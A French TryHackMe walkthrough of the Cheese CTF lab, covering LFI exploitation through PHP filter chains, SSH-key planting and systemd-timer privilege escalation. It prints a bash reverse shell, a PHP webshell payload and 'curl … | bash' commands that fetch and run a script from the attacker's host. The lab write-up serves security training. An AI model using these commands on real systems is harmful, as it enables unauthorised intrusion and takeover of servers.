---
title: "TryHackMe Room Cheesectfv10"
seoTitle: "Cheesectfv10: Explore the TryHackMe Challenge"
seoDescription: "Learn how to gain shell access using reverse shells and PHP filter chains in the TryHackMe Cheese CTF Room"
datePublished: Tue May 06 2025 16:06:14 GMT+0000 (Coordinated Universal Time)
cuid: cmacpbxs0000109ikes4r0u3m
slug: tryhackme-room-cheesectfv10
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1746543221556/353365c1-1112-43c2-973d-890a1e22c750.png
tags: shell, cybersecurity-1, tryhackme, tryhackme-walkthrough, cheesectfv10

---

Lien de la room: [TryHackMe | Chese CTF](https://tryhackme.com/room/cheesectfv10)

# Énumération

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746549859868/eeba2534-e13f-4180-87dc-15d04525f83a.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746549887341/b953e0e6-86f7-4548-9f25-46e2840b248b.png align="center")

# Obtenir l’accès shell

## Avec le paramètre cmd

1. Créer un fichier `shell.sh` pour mon script de reverse shell. On veut donc initier la connexion depuis la machine cible.
    

Remplacer 10.10.102.158 par l’adresse IP de votre machine.

```bash
cat shell.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.102.158/4444 0>&1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746544143626/615e08b3-a3e5-4eaa-91cc-19bea55574bf.png align="center")

2. Démarrer le listener netcat sur la machine principale pour écouter les connexions entrantes sur le port 4444
    

```bash
nc -lvnp 4444
```

3. Démarrer un serveur HTTP qui va contenir le fichier `shell.sh`. Le fichier doit être dans le le répertoire courant où vous exécutez la commande.
    

```bash
python -m http.server 8000
```

4. Utiliser l’outil [php\_filter\_chain\_generator](https://github.com/synacktiv/php_filter_chain_generator) pour générer la chaîne de filtres PHP
    

```bash
python3 attack.py --chain '<?php system($_GET["cmd"]); ?>'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746544061591/53a75b57-8673-40b2-855d-4f3f19525946.png align="center")

Ici on utilise `'<?php system($_GET["cmd"]); ?>'` car on veut exécuter des commandes sur le serveur cible via le paramètre `cmd` dans l’URL. On veut exploiter une vulnérabilité de type Local File Inclusion LFI afin d’exécuter des commandes arbitraires sur la cible.

5. Modifier l’URL vulnérable pour y ajouter `la chaîne de filtres PHP générée` et le paramètre `cmd`.
    

URL de base: <mark>http://10.10.162.24/secret-script.php?file=php://filter/resource=users.html</mark>

Début de la chaîne de filtre PHP : <mark>php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode</mark>

Fin de la chaîne de filtre PHP: <mark>UTF8.UTF7|convert.base64-decode/resource=php://temp</mark>

On rajoute donc le paramètre <mark>&amp;cmd=curl http://10.10.102.158:8000/shell.sh | bash</mark> à la fin de la chaîne de filtre PHP et on obtient ainsi le reverse shell.

* `curl http://10.10.102.158:8000/revshell.sh`: utilise l’outil curl pour télécharger le fichier shell.sh depuis le serveur HTTP sur le port 80
    
* `| bash`: redirige la sortie de la commande curl vers l’interpréteur de commandes bash, pour exécuter le script.
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746547286658/cabf2748-9b25-4180-8215-00b55abacc29.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746545277448/eb5f10ea-c90f-4b52-865c-e53d93920002.png align="center")

## Avec curl

On peut aussi spécifier directement la commande curl dans le payload lors de la génération de la chaîne de filtres PHP. C’est une alternative pour exécuter directement la commande curl sur le serveur, sans avoir à passer de paramètres supplémentaires à l’URL.

```bash
python3 attack.py --chain '<?= `curl 10.10.102.158:8000/shell.sh | bash` ?>'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746548656865/269b63b9-85e4-44f9-9f18-439422d48219.png align="center")

Ce payload utilise la syntaxe courte `<?= ?>` pour exécuter la commande `curl` qui télécharge et exécute le script `shell.sh` depuis le serveur HTTP.

Une fois la chaîne de filtres générée, on peut l’intégrer dans l’URL et obtenir l’accès sur la machine en reverse shell.

# Flag user.txt

On veut lire le contenu du fichier user.txt

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746637426433/df5bbc2e-1837-4ed3-84ee-beb3dba45cb0.png align="center")

Il faut donc trouver un moyen de pouvoir lire le contenu du fichier `user.txt`. Seul le propriétaire `comte` a le droit de lire et écrire dans le fichier. Vu qu’on est connecté à `www-data`, on a aucun droit.

On essaiera de vérifier si `www-data` n’a pas accès à d’autres fichiers ou répertoires.

```bash
find /home/comte -type f -readable -writable
```

Cette commande permet de lister les fichiers dans le répertoire `/home/comte` et les sous-répertoires, que l’utilisateur `www-data` peut lire (-readable) et écrire (-writable).

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746640001975/81188dc6-acc5-4a33-b148-cd4c365e96e2.png align="center")

On peut donc voir que le fichier `authorized_keys` dans le répertoire `/.ssh` peut être lisible et modifiable par `www-data`.

Ce fichier est composant du mécanisme d’authentification par clé publiques de SSH. Il contient une liste de clés publiques SSH appartenant aux utilisateurs autorisés à se connecter à un compte spécifique. Il fonctionne avec une clé privée, qui est sur la machine de l’utilisateur qui se connecte.

À noter que dans le cas d’une authentification par clé SSH, on a pas besoin du mot de passe de l’utilisateur car SSH utilise la correspondance entre la clé privée et la clé publique placée dans le fichier `authorized_keys` de `comte`.

Sur la machine principale, on génère une paire de clé avec la commande `ssh-keygen -t rsa`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746641847543/328ec365-afe3-45b9-9efd-8ee996d561b7.png align="center")

On obtient une clé privée (key\_rsa) et la clé publique associée (key\_rsa.pub).

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746643650075/beb7c51c-a5b8-4a65-ba70-dbcf34bbc76f.png align="center")

Il faut ensuite copier le contenu de la clé publique dans le fichier `authorised_keys` de la machine cible afin dese connecter au compte `comte` depuis la machine principale via SSH.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746642068184/5ad91320-1162-41c2-a33a-731dffbb60a5.png align="center")

Sur la machine principale sur laquelle la paire de clés a été générée, lancer la connexion ssh en utilisant la clé privée.

```bash
ssh -i key_rsa comte@10.10.46.126
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746642211249/e31cf5fa-7c8a-4ce6-b327-087961a17ed0.png align="center")

On a arrive donc à se connecter au compte `comte` et on obtient le flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746642243905/677b07a0-477f-4c2a-9aa1-c37b1556f7d7.png align="center")

# Flag root.txt

On commence par la commande `sudo -l` pour afficher les commandes privilèges que l’utilisateur comte peut exécuter via sudo.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746646645464/8afcbef2-68eb-48f6-83ef-1551207a2fd9.png align="center")

On voit qu’on peut exécuter des commandes `systemctl` sans avoir à fournir de mot de passe. On peut (re)démarrer, activer le service `exploit.timer` ou recharger les fichiers de configuration des services systemd via `daemon-reload`.

Une unité `.timer` est utilisée pour planifier des tâches. Si `exploit.timer` est donc mal configurée, on peut l’exploiter.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746648740051/8ceed75d-45ed-4d97-9b27-2894ec00b4a2.png align="center")

Le fichier de configuration `exploit.timer` est incomplet. Au niveau de la section `Timer`, le champ `OnBootSec` spécifie un délai après le démarrage du système avant que la minuterie ne s'active.

Le fichier `exploit.service` est bien configuré: c’est un service de type `oneshot`, il exécute une commande unique et se termine. Elle exécute un script bash qui copie `/usr/bin/xxd` dans `/opt/xxd` et modifie ses permissions (+sx). Cela signifie que le binaire `/opt/xxd` sera exécuté avec les privilèges de son propriétaire, qui est `root`.

Puisqu’on peut modifier le fichier `exploit.timer`, on y ajoutera une valeur à `OnBootSec=` pour activer la minuterie, ce qui déclenchera l'exécution de `exploit.service`.